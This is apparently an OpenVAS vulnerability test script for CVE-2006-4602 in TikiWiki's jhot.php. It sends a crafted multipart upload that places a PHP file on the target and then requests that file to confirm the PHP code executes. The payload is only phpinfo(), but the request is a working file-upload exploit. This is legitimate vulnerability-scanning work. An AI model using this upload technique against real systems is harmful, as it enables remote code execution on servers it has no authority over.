##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tikiwiki_jhot_remote_cmd_exec_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# TikiWiki jhot.php Remote Command Execution Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################i###############################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let the attacker execute arbitrary system
  commands with the privileges of the webserver process.
  Impact Level: System/Application";
tag_affected = "TikiWiki version 1.9.4 and prior";
tag_insight = "The flaw is due to 'jhot.php' script not correctly verifying
  uploaded files. This can be exploited to execute arbitrary PHP code by
  uploading a malicious PHP script to the 'img/wiki' directory.";
tag_solution = "Upgrade to TikiWiki version 1.9.5 or later
  For updates refer to http://info.tiki.org/Download";
tag_summary = "This host is running TikiWiki and is prone to remote command
  execution vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802946";
CPE = "cpe:/a:tikiwiki:tikiwiki";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2006-4602");
  script_bugtraq_id(19819);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-08-22 13:59:26 +0530 (Wed, 22 Aug 2012)");
  script_name("TikiWiki jhot.php Remote Command Execution Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/28456");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/21733");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/2288/");

  script_description(desc);
  script_summary("Check for Command Execution vulnerability in Tikiwiki");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_tikiwiki_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("TikiWiki/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");

## Variable Initialization
port = "";
dir = "";
host = "";
req = "";
buf = "";
fname = "";
content = "";
header = "";
sndReq2 = "";
rcvRes2 = "";
url = "";

## Get tikiwiki port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Check the port state
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Tikiwiki dir
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port)){
  exit(0);
}

req = http_get(item:string(dir, "/jhot.php"), port:port);
buf = http_keepalive_send_recv(port:port, data:req);

if(!egrep(pattern:"^HTTP/.* 200 OK", string:buf)){
  exit(0);
}

## Get the Host
host = get_host_name();
if(!host){
  exit(0);
}

fname = "ovtest_" + rand() + ".php";

## Create a random file and write the data into file
content = string("--bound\r\n",
                 "Content-Disposition: form-data; name='filepath'; filename='" + fname + "';\r\n",
                 "Content-Type: image/jpeg;\r\n",
                 "\r\n",
                 "<?php phpinfo(); ?>\r\n",
                 "\r\n",
                 "--bound--\r\n");

## Construct the request to upload the file
header = string("POST ", dir, "/jhot.php HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "User-Agent: TikiWiki Commond Execution \r\n",
                "Connection: Keep-Alive\r\n",
                "Content-Type: multipart/form-data; boundary=bound\r\n",
                "Content-Length: " +  strlen(content) + "\r\n\r\n");

sndReq2 = header + content;
rcvRes2 = http_keepalive_send_recv(port:port, data:sndReq2);

if(rcvRes2 && egrep(pattern:"^HTTP/.* 200 OK", string:rcvRes2))
{
  ## Construct the request to view the contents of '/img/wiki/random file'
  url = dir + "/img/wiki/" + fname;

  ## Check the contents of the uploaded file
  if(http_vuln_check(port:port, url:url,
                   pattern:"<title>phpinfo()", check_header: TRUE)){
    security_hole(port);
  }
}
